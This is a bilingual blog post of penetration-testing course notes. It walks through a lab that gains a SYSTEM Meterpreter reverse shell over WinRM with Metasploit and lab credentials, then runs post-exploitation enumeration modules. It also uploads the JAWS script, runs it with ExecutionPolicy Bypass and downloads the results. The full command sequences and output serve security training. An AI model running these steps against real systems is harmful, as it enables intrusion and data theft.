---
layout: post
title: "Automating Windows Local Enumeration"
date: "2023-06-08"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Local Enumeration
## Automating Windows Local Enumeration
In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.

While local enumeration techniques/commands are important to know, as a penetration tester, you will need to be time efficient. As a result, you will need to learn how to utilize various automated enumeration scripts.

In addition to automating the process of enumerating information like system information, users & groups etc, these automated enumeration scripts will also provide you with additional information regarding the target system like; privilege escalation vulnerabilities, locally stored passwords etc.

# Windows 本地枚举
## 自动化 Windows 本地枚举
除了手动执行本地枚举外，我们还可以借助一些脚本和 MSF 模块来自动化该过程。

虽然了解本地枚举技术/命令很重要，作为渗透测试人员，您需要高效利用时间。因此，您需要学习如何利用各种自动化枚举脚本。

除了自动化枚举系统信息、用户和组等信息的过程外，这些自动化枚举脚本还将为您提供有关目标系统的其他信息，例如：权限提升漏洞、本地存储的密码等。

## Windows Local Enum Scripts
JAWS - Just Another Windows (Enum) Script - JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.

GitHub Repo: [411Hall/JAWS](https://github.com/411Hall/JAWS)

# Demo: Automating Windows Local Enumeration

## Windows 本地枚举脚本
JAWS - 另一个 Windows（枚举）脚本 - JAWS 是一个 PowerShell 脚本，旨在帮助渗透测试人员（和 CTF 玩家）快速识别 Windows 系统上潜在的权限提升途径。它使用 PowerShell 2.0 编写，所以“应该”可以在自 Windows 7 起的每个 Windows 版本上运行。

GitHub 仓库：[411Hall/JAWS](https://github.com/411Hall/JAWS)

# 演示：自动化 Windows 本地枚举
Target IP Address : 10.2.21.181

This target system has WinRM enabled. It runs on TCP port 5985 by default. So we can perform a quick service version detection scan on that specific port 5985.

```
nmap -sV -p 5985 10.2.21.181
```

In order to exploit winRM, we are going to require legitimate credentials for the target system.

Username: administrator

Password: tinkerbell

[WinRM Script Exec Remote Code Execution](https://www.rapid7.com/db/modules/exploit/windows/winrm/winrm_script_exec/)

WinRM Script Exec Remote Code Execution

This module uses valid credentials to login to the WinRM service and execute a payload. It has two available methods for payload delivery: Powershell 2 (and above) and VBS CmdStager. The module will check if Powershell is available, and if so uses that method. Otherwise it falls back to the VBS CmdStager which is less stealthy.

WinRM脚本执行远程代码执行

该模块使用有效的凭据登录到WinRM服务并执行负载。它有两种可用的负载传递方法：Powershell 2（及以上版本）和VBS CmdStager。该模块将检查Powershell是否可用，如果可用则使用该方法。否则，它将回退到较不隐蔽的VBS CmdStager方法。

This will provide us with administrative privileges. 

```
msfconsole -q
search winrm
use use exploit/windows/winrm/winrm_script_exec # use 4
show options
set RHOSTS 10.2.21.181
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
```

Once it is sent the command stager, it should execute it and we should be provided with a Meterpreter session. In addition to that, this module will also run the post-exploitation migrate module that will migrate our process form the current process into a different process. Once it's successfully migrated, it'll provide us with an elevated Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.

```
meterpreter > sysinfo
```

We have a 64-bit Meterpreter session.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We have the highest privileges available on a Windows system, which is `NT AUTHORITY\SYSTEM`.

If you wanted to get an idea of the other drives that are connected to a Windows system via Meterpreter.

show_mount    List all mount points/logical drives

show_mount 列出所有挂载点/逻辑驱动器

```
meterpreter > show_mount
```

That'll tell you the list of mounts and drives that you have. So if the target system had an external hard drive or a flash drive connected to it, it'll display that here. And it'll also display where it's been mapped to.

```
meterpreter > background
```

[Windows Gather Privileges Enumeration](https://www.rapid7.com/db/modules/post/windows/gather/win_privs/)

Windows Gather Privileges Enumeration

This module will print if UAC is enabled, and if the current account is ADMIN enabled. It will also print UID, foreground SESSION ID, is SYSTEM status and current process PRIVILEGES.

Windows权限枚举

该模块将打印出UAC是否已启用，以及当前账户是否启用了ADMIN权限。它还将打印UID、前台SESSION ID、SYSTEM状态以及当前进程的权限信息。

```
search win_privs
use post/windows/gather/win_privs # use 0
show options
sessions
set SESSION 1
run
```

We did this previously using the `get privs` command when we were exploring how to enumerate user and group information. This will give you a little bit more information. It'll tell you whether the current user is Administrator, whether it has `NT AUTHORITY\SYSTEM` system privileges, whether it is part of the local admin group, whether UAC is enabled. So User Access Control is not enabled in this case, and the user id is `NT AUTHORITY\SYSTEM`. And then it'll display a list of Windows privileges assigned to the current user you have access to.

We can also search for another one that will display the logged on users.

[Windows Gather Logged On User Enumeration (Registry)](https://www.rapid7.com/db/modules/post/windows/gather/enum_logged_on_users/)

Windows Gather Logged On User Enumeration (Registry)

This module will enumerate current and recently logged on Windows users.

Windows获取已登录用户枚举（注册表）

该模块将枚举当前和最近登录的Windows用户。

```
search enum_logged
use post/windows/gather/enum_logged_on_users # use 0
set SESSION 1
run
```

Windows Gather Virtual Environment Detection

This module attempts to determine whether the system is running inside of a virtual environment and if so, which one. This module supports detection of Hyper-V, VMWare, Virtual PC, VirtualBox, Xen, and QEMU.

Windows获取虚拟环境检测

该模块尝试确定系统是否在虚拟环境中运行，如果是的话，是哪个虚拟环境。该模块支持检测Hyper-V、VMWare、Virtual PC、VirtualBox、Xen和QEMU。

This will tell you whether the target system is a virtual machine. This might be important if you are trying to understand whether the system you have just exploited is running on a bare metal system or it is a virtual machine.

```
search checkvm
use post/windows/gather/checkvm # use 2
set SESSION 1
run
```

It's going to check whether the target is a virtual machine. That information is very important if you're trying to identify whether you've exploited a virtual machine or a real workstation or laptop for that matter.

We can also enumerate a list of installed applications or programs on the target system. This can be very important if you are trying to identify a program that is installed on a target system that might be vulnerable to a particular exploit, more specifically, a privilege escalation exploit or vulnerability for that matter.

[Windows Gather Installed Application Enumeration](https://www.rapid7.com/db/modules/post/windows/gather/enum_applications/)

Windows Gather Installed Application Enumeration

This module will enumerate all installed applications on a Windows system

Windows获取已安装应用程序枚举

该模块将枚举Windows系统上的所有已安装应用程序。

```
search enum_applications
use post/windows/gather/enum_applications # use 0
set SESSION 1
run
```

It's going to enumerate all installed applications on the target system.

[Windows Gather Enumerate Computers](https://www.rapid7.com/db/modules/post/windows/gather/enum_computers/)

Windows Gather Enumerate Computers

This module will enumerate computers included in the primary Domain.

Windows枚举计算机

该模块将枚举包含在主域中的计算机。

The one that I'm going to cover now is a post exploitation module that will enumerate all other computers connected to the same network of the system that you've just exploited.

```
search enum_computers
use post/windows/gather/enum_computers # use 0
set SESSION 1
run
```

The target system is not part of a domain, which makes sense, because this is running in the cloud. If you ran this module on a target system that is part of a network or domain, it will enumerate the other systems that are connected to that network, which is very important during the pivoting phase of post exploitation.

Enumerate a list of installed patches or updates.

Windows Gather Applied Patches

This module enumerates patches applied to a Windows system using the WMI query: SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering.

Windows获取已应用的补丁

该模块使用WMI查询枚举已应用于Windows系统的补丁：SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering。

[Windows Gather Applied Patches](https://www.rapid7.com/db/modules/post/windows/gather/enum_patches/)

```
search enum_patches
use post/windows/gather/enum_patches # use 0
set SESSION 1
run
```

That will automate the process of getting a list of installed patches.

Another post-exploitation module is the enum shares module, which will enumerate a list of SMB shares that is accessible from the target system you have exploited. And this is very useful when you're working in a target environment that has multiple systems connected to a network. And in some cases, they could have share set up to share files, etc.

[Windows Gather SMB Share Enumeration via Registry](https://www.rapid7.com/db/modules/post/windows/gather/enum_shares/)

Windows Gather SMB Share Enumeration via Registry

This module will enumerate configured and recently used file shares.

Windows通过注册表枚举SMB共享

该模块将枚举已配置和最近使用的文件共享。

```
search enum_shares
use post/windows/gather/enum_shares # use 0
set SESSION 1
run
```

This is a list of extremely helpful Metasploit Framework post exploitation modules for Windows local enumeration or to automate Windows local enumeration.

[411Hall/JAWS](https://github.com/411Hall/JAWS)

JAWS - Just Another Windows (Enum) Script

JAWS是一个PowerShell脚本，旨在帮助渗透测试人员（和CTFers）快速识别Windows系统上的潜在提权向量。它使用PowerShell 2.0编写，因此“应该”可以在自Windows 7以来的所有Windows版本上运行。

用法：

从CMD shell中运行并写入文件。

```
CMD C：\ temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

从CMD shell中运行并写入屏幕。

```
CMD C：\ temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
```

从PS Shell中运行并写入文件。

```
PS C：\ temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
```

当前功能
* 网络信息（接口，arp，netstat）
* 防火墙状态和规则
* 正在运行的进程
* 具有完全控制或修改访问权限的文件和文件夹
* 映射的驱动器
* 潜在有趣的文件
* 未引用的服务路径
* 最近的文档
* 系统安装文件
* AlwaysInstallElevated注册表键检查
* 存储的凭据
* 安装的应用程序
* 潜在易受攻击的服务
* MuiCache文件
* 定期任务

In order to copy this to the lab environment, we are going to copy the content of the PowerShell script.

`Raw`: Get the raw output.

Once this is copied I can now switch over to my lab environment where I'll show you how to paste this into the lab environment clipboard.

I'm back within the lab environment, and to paste what we have copied, what you need to do is, on your keyboard, use the following keyboard combination: `Ctrl+Shift+Alt`. That will open up your clipboard options here. I'll close this side menu by saying `Ctrl+Shift+Alt`.

We now need to create the JAWS script.

We're going to need to upload it to the target system.

We can open up our current Meterpreter session.

```
sessions
sessions 1
```

Within the root of the C drive, whenever you're copying over exploit files or scripts that you're using during a pentest, always save them within the Temp directory stored within the root of the C drive. If the Temp directory doesn't exist, you can create it by saying: `mkdir Temp`. And we're going to upload it within the Temp directory.

```
meterpreter > cd C:\\
meterpreter > mkdir Temp
meterpreter > cd Temp
meterpreter > upload /root/Desktop/jaws-enum.ps1
```

Open up a command shell session.

```
meterpreter > shell
C:\Temp>dir
```

To execute a PowerShell script from within a Windows command shell session. We then need to set up the execution policy. Because we are running a PowerShell script, Windows by default doesn't allow users to execute PowerShell scripts. So we need to set the execution policy. This will allow us to run the jaws-enum PowerShell script without any issues. We then specify the file that we would like to execute. We're going to save the output produced by jaws-enum PowerShell script into a text file.

```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

I want you to execute the jaws-enum.ps1 PowerShell script with PowerShell, and I want you to output the output produced by the jaws-enum.ps1 PowerShell script into a text file called JAWS-Enum.txt. The reason we are doing that is because we're enumerating all of the information you saw on the JAWS Github repository, it's going to display a lot of information. And we don't want that information to be displayed on our terminal because we want to analyze it within a text file so that we can scroll through what we're interested in. And that is also very important for the purpose of record keeping and note taking during a penetration test.

It's going to perform all of the enumeration checks that we did during this section.

We need to download JAWS-Enum.txt onto our Kali Linux system.

```
meterpreter > ls
meterpreter > download JAWS-Enum.txt
```

Files with Full Control and Modify Access, Folders with Full Control and Modify Access: This is very useful during privilege escalation. So it'll tell you what folders and files you can modify or that you have the permissions to modify. And it makes sense that the only directories we can modify belong to the Administrator user as well as a few others.

JAWS is one that has helped me previously and is extremely useful to automate the local enumeration process on Windows.

That is how to automate the local enumeration process on Windows.

# Automating Windows Local Enumeration
## Overview
Goal

This lab covers the process of automating local enumeration on Windows by leveraging various post-exploitation Metasploit modules and local enumeration scripts.

# 自动化 Windows 本地枚举
## 概述
目标

本实验涵盖了通过利用各种后渗透 Metasploit 模块和本地枚举脚本在 Windows 上自动执行本地枚举的过程。

## 复现视频内容
Target IP Address : 10.0.21.89

Kali Linux : 10.10.16.3

```
root@attackdefense:~# nmap -sV -p 5985 10.0.21.89
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-08 07:54 IST
Nmap scan report for 10.0.21.89
Host is up (0.0031s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

```
root@attackdefense:~# msfconsole -q
msf6 > search winrm

Matching Modules
================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  auxiliary/scanner/winrm/winrm_auth_methods                   normal  No     WinRM Authentication Method Detection
   1  auxiliary/scanner/winrm/winrm_cmd                            normal  No     WinRM Command Runner
   2  auxiliary/scanner/winrm/winrm_login                          normal  No     WinRM Login Utility
   3  auxiliary/scanner/winrm/winrm_wql                            normal  No     WinRM WQL Query Runner
   4  exploit/windows/winrm/winrm_script_exec     2012-11-01       manual  No     WinRM Script Exec Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/winrm/winrm_script_exec

msf6 > use exploit/windows/winrm/winrm_script_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/winrm/winrm_script_exec) > show options

Module options (exploit/windows/winrm/winrm_script_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
   PASSWORD                    yes       A specific password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      5985             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URI        /wsman           yes       The URI of the WinRM service
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       A specific username to authenticate as
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.0.21.89
RHOSTS => 10.0.21.89
msf6 exploit(windows/winrm/winrm_script_exec) > set USERNAME administrator
USERNAME => administrator
msf6 exploit(windows/winrm/winrm_script_exec) > set PASSWORD tinkerbell
PASSWORD => tinkerbell
msf6 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
FORCE_VBS => true
msf6 exploit(windows/winrm/winrm_script_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] User selected the FORCE_VBS option
[*] Command Stager progress -   2.01% done (2046/101936 bytes)
[*] Command Stager progress -   4.01% done (4092/101936 bytes)
[*] Command Stager progress -   6.02% done (6138/101936 bytes)
[*] Command Stager progress -  92.33% done (94116/101936 bytes)
[*] Command Stager progress -  94.34% done (96162/101936 bytes)
[*] Command Stager progress -  96.34% done (98208/101936 bytes)
[*] Command Stager progress -  98.35% done (100252/101936 bytes)
[*] Sending stage (175174 bytes) to 10.0.21.89
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.0.21.89:49777) at 2023-06-08 08:02:20 +0530
[*] Session ID 1 (10.10.16.3:4444 -> 10.0.21.89:49777) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
[*] Current session process is usqrl.exe (4556) as: SERVER\Administrator
[*] Session is Admin but not System.
[*] Will attempt to migrate to specified System level process.
[-] Could not migrate to services.exe.
[-] Could not migrate to wininit.exe.
[*] Trying svchost.exe (884)
[+] Successfully migrated to svchost.exe (884) as: NT AUTHORITY\SYSTEM
[*] nil
[*] Command Stager progress - 100.00% done (101936/101936 bytes)

meterpreter > 
```

```
meterpreter > sysinfo
Computer        : SERVER
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > show_mount

Mounts / Drives
===============

Name  Type   Size (Total)  Size (Free)  Mapped to
----  ----   ------------  -----------  ---------
C:\   fixed  30.00 GiB     15.98 GiB    


Total mounts/drives: 1
```

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/winrm/winrm_script_exec) > search win_privs

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   0  post/windows/gather/win_privs                   normal  No     Windows Gather Privileges Enumeration


Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/win_privs

msf6 exploit(windows/winrm/winrm_script_exec) > use post/windows/gather/win_privs
msf6 post(windows/gather/win_privs) > show options

Module options (post/windows/gather/win_privs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf6 post(windows/gather/win_privs) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x64/windows  SERVER\Administrator @ SERVER  10.10.16.3:4444 -> 10.0.21.89:49777 (10.0.21.89)

msf6 post(windows/gather/win_privs) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/win_privs) > run

Current User
============

 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
 --------  ---------  -----------------------  -----------  -------------  ---
 True      True       True                     False        1              NT AUTHORITY\SYSTEM

Windows Privileges
==================

 Name
 ----
 SeAssignPrimaryTokenPrivilege
 SeAuditPrivilege
 SeBackupPrivilege
 SeChangeNotifyPrivilege
 SeCreateGlobalPrivilege
 SeCreatePagefilePrivilege
 SeCreatePermanentPrivilege
 SeCreateSymbolicLinkPrivilege
 SeDebugPrivilege
 SeImpersonatePrivilege
 SeIncreaseBasePriorityPrivilege
 SeIncreaseQuotaPrivilege
 SeIncreaseWorkingSetPrivilege
 SeLoadDriverPrivilege
 SeLockMemoryPrivilege
 SeManageVolumePrivilege
 SeProfileSingleProcessPrivilege
 SeRestorePrivilege
 SeSecurityPrivilege
 SeShutdownPrivilege
 SeSystemEnvironmentPrivilege
 SeSystemProfilePrivilege
 SeSystemtimePrivilege
 SeTakeOwnershipPrivilege
 SeTcbPrivilege
 SeTimeZonePrivilege
 SeUndockPrivilege

[*] Post module execution completed
```

```
msf6 post(windows/gather/win_privs) > search enum_logged

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/windows/gather/enum_logged_on_users                   normal  No     Windows Gather Logged On User Enumeration (Registry)


Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_logged_on_users

msf6 post(windows/gather/win_privs) > use post/windows/gather/enum_logged_on_users
msf6 post(windows/gather/enum_logged_on_users) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_logged_on_users) > run

[*] Running against session 1

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-18                                       NT AUTHORITY\SYSTEM
 S-1-5-21-1560653127-1539696675-2954027093-500  SERVER\Administrator


[+] Results saved in: /root/.msf4/loot/20230608081702_default_10.0.21.89_host.users.activ_522109.txt

Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%\system32\config\systemprofile
 S-1-5-19                                       %systemroot%\ServiceProfiles\LocalService
 S-1-5-20                                       %systemroot%\ServiceProfiles\NetworkService
 S-1-5-21-1560653127-1539696675-2954027093-500  C:\Users\Administrator


[*] Post module execution completed
```

```
msf6 post(windows/gather/enum_logged_on_users) > search checkvm

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  post/linux/gather/checkvm                     normal  No     Linux Gather Virtual Environment Detection
   1  post/solaris/gather/checkvm                   normal  No     Solaris Gather Virtual Environment Detection
   2  post/windows/gather/checkvm                   normal  No     Windows Gather Virtual Environment Detection


Interact with a module by name or index. For example info 2, use 2 or use post/windows/gather/checkvm

msf6 post(windows/gather/enum_logged_on_users) > use post/windows/gather/checkvm
msf6 post(windows/gather/checkvm) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/checkvm) > run

[*] Checking if SERVER is a Virtual Machine ...
[+] This is a Xen Virtual Machine
[*] Post module execution completed
```

```
msf6 post(windows/gather/checkvm) > search enum_applications

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  post/windows/gather/enum_applications                   normal  No     Windows Gather Installed Application Enumeration


Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_applications

msf6 post(windows/gather/checkvm) > use post/windows/gather/enum_applications
msf6 post(windows/gather/enum_applications) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_applications) > run

[*] Enumerating applications installed on SERVER

Installed Applications
======================

 Name                   Version
 ----                   -------
 AWS PV Drivers         8.3.4
 AWS Tools for Windows  3.15.1110
 Amazon SSM Agent       2.3.1319.0
 Amazon SSM Agent       2.3.1319.0
 aws-cfn-bootstrap      1.4.33


[+] Results stored in: /root/.msf4/loot/20230608082356_default_10.0.21.89_host.application_672942.txt
[*] Post module execution completed
```

```
msf6 post(windows/gather/enum_applications) > search enum_computers

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  post/windows/gather/enum_computers                   normal  No     Windows Gather Enumerate Computers


Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_computers

msf6 post(windows/gather/enum_applications) > use post/windows/gather/enum_computers
msf6 post(windows/gather/enum_computers) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_computers) > run

[*] Running module against SERVER
[-] This host is not part of a domain.
[*] Post module execution completed
```

```
msf6 post(windows/gather/enum_computers) > search enum_patches

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  post/windows/gather/enum_patches                   normal  No     Windows Gather Applied Patches


Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_patches

msf6 post(windows/gather/enum_computers) > use post/windows/gather/enum_patches
msf6 post(windows/gather/enum_patches) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_patches) > run

[*] Patch list saved to /root/.msf4/loot/20230608082907_default_10.0.21.89_enum_patches_855018.txt
[+] KB4570720 installed on 9/9/2020
[+] KB4470502 installed on 12/12/2018
[+] KB4470788 installed on 12/12/2018
[+] KB4480056 installed on 1/9/2019
[+] KB4493510 installed on 4/21/2019
[+] KB4494174 installed on 3/18/2020
[+] KB4499728 installed on 5/15/2019
[+] KB4504369 installed on 6/12/2019
[+] KB4512577 installed on 9/11/2019
[+] KB4512937 installed on 9/6/2019
[+] KB4521862 installed on 10/9/2019
[+] KB4523204 installed on 11/13/2019
[+] KB4539571 installed on 3/18/2020
[+] KB4549947 installed on 4/15/2020
[+] KB4558997 installed on 7/15/2020
[+] KB4561600 installed on 6/10/2020
[+] KB4562562 installed on 6/10/2020
[+] KB4566424 installed on 8/12/2020
[+] KB4570332 installed on 9/9/2020
[+] KB4570333 installed on 9/9/2020
[*] Post module execution completed
```

```
msf6 post(windows/gather/enum_patches) > search enum_shares

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  post/windows/gather/enum_shares                   normal  No     Windows Gather SMB Share Enumeration via Registry


Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_shares

msf6 post(windows/gather/enum_patches) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_shares) > run

[*] Running against session 1
[*] No shares were found
[*] Post module execution completed
```

```
msf6 post(windows/gather/enum_shares) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x64/windows  SERVER\Administrator @ SERVER  10.10.16.3:4444 -> 10.0.21.89:49777 (10.0.21.89)

msf6 post(windows/gather/enum_shares) > sessions 1
[*] Starting interaction with 1...

meterpreter > cd C:\\
meterpreter > dir
Listing: C:\
============

Mode              Size           Type  Last modified               Name
----              ----           ----  -------------               ----
40777/rwxrwxrwx   0              dir   2018-09-15 12:49:00 +0530   $Recycle.Bin
100666/rw-rw-rw-  1              fil   2018-11-14 12:26:16 +0530   BOOTNXT
40777/rwxrwxrwx   8192           dir   2018-11-14 12:26:15 +0530   Boot
40777/rwxrwxrwx   0              dir   2018-11-14 21:40:15 +0530   Documents and Settings
40777/rwxrwxrwx   0              dir   2018-11-14 12:26:17 +0530   EFI
40777/rwxrwxrwx   0              dir   2018-09-15 12:49:00 +0530   PerfLogs
40555/r-xr-xr-x   4096           dir   2018-09-15 12:49:00 +0530   Program Files
40777/rwxrwxrwx   4096           dir   2018-09-15 12:49:00 +0530   Program Files (x86)
40777/rwxrwxrwx   4096           dir   2018-09-15 12:49:00 +0530   ProgramData
40777/rwxrwxrwx   0              dir   2018-11-15 05:37:05 +0530   Recovery
40777/rwxrwxrwx   4096           dir   2020-10-01 19:31:35 +0530   System Volume Information
40555/r-xr-xr-x   4096           dir   2018-09-15 11:39:26 +0530   Users
40777/rwxrwxrwx   16384          dir   2018-09-15 11:39:26 +0530   Windows
100444/r--r--r--  408692         fil   2018-11-14 12:26:16 +0530   bootmgr
100666/rw-rw-rw-  32             fil   2020-10-01 20:22:45 +0530   flag.txt
0271/-w-rwx--x    2437854481536  fif   79222-07-19 00:03:36 +0530  pagefile.sys

meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp
meterpreter > upload /root/Desktop/jaws-enum.ps1
[*] uploading  : /root/Desktop/jaws-enum.ps1 -> jaws-enum.ps1
[*] Uploaded 16.58 KiB of 16.58 KiB (100.0%): /root/Desktop/jaws-enum.ps1 -> jaws-enum.ps1
[*] uploaded   : /root/Desktop/jaws-enum.ps1 -> jaws-enum.ps1
meterpreter > pwd
C:\Temp
```

```
meterpreter > shell
Process 5028 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Temp

06/08/2023  03:09 AM    <DIR>          .
06/08/2023  03:09 AM    <DIR>          ..
06/08/2023  03:09 AM            16,974 jaws-enum.ps1
               1 File(s)         16,974 bytes
               2 Dir(s)  17,460,965,376 bytes free
```

```
C:\Temp>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt 
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

Running J.A.W.S. Enumeration
	- Gathering User Information
	- Gathering Processes, Services and Scheduled Tasks
	- Gathering Installed Software
	- Gathering File System Information
	- Looking for Simple Priv Esc Methods
get-itemproperty : Property DefaultPassword does not exist at path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon.
At C:\Temp\jaws-enum.ps1:247 char:26
+ ... Password = (get-itemproperty -path $Winlogon -Name DefaultPassword).D ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (DefaultPassword:String) [Get-ItemProperty], PSArgumentException
    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException,Microsoft.PowerShell.Commands.GetItemPr 
   opertyCommand
```

```
C:\Temp>^C
Terminate channel 2? [y/N]  y
meterpreter > ls
Listing: C:\Temp
================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  95469  fil   2023-06-08 09:04:06 +0530  JAWS-Enum.txt
100666/rw-rw-rw-  16974  fil   2023-06-08 09:02:10 +0530  jaws-enum.ps1

meterpreter > download JAWS-Enum.txt
[*] Downloading: JAWS-Enum.txt -> /root/JAWS-Enum.txt
[*] Downloaded 93.23 KiB of 93.23 KiB (100.0%): JAWS-Enum.txt -> /root/JAWS-Enum.txt
[*] download   : JAWS-Enum.txt -> /root/JAWS-Enum.txt
```

```
############################################################
##     J.A.W.S. (Just Another Windows Enum Script)        ##
##                                                        ##
##           https://github.com/411Hall/JAWS              ##
##                                                        ##
############################################################

Windows Version: Microsoft Windows Server 2019 Datacenter
Architecture: AMD64
Hostname: SERVER
Current User: SERVER$
Current Time\Date: 06/08/2023 03:34:07

-----------------------------------------------------------
 Users
-----------------------------------------------------------
----------
Username: Administrator
Groups:   Administrators
----------
Username: auditor
Groups:   Users
----------
Username: DefaultAccount
Groups:   System Managed Accounts Group
----------
Username: demo
Groups:   Users
----------
Username: Guest
Groups:   Guests
----------
Username: sysadmin
Groups:   Users
----------
Username: WDAGUtilityAccount
Groups:   

-----------------------------------------------------------
 Network Information
-----------------------------------------------------------

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::c87f:b0cf:3941:97b1%4
   IPv4 Address. . . . . . . . . . . : 10.0.27.7
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.0.16.1

-----------------------------------------------------------
 Arp
-----------------------------------------------------------

Interface: 10.0.27.7 --- 0x4
  Internet Address      Physical Address      Type
  10.0.16.1             06-73-41-c8-ca-42     dynamic   
  10.0.24.47            06-6d-76-fa-cd-9e     dynamic   
  10.0.24.176           06-20-14-ab-88-8c     dynamic   
  10.0.31.103           06-4d-7a-33-38-c2     dynamic   
  10.0.31.255           ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
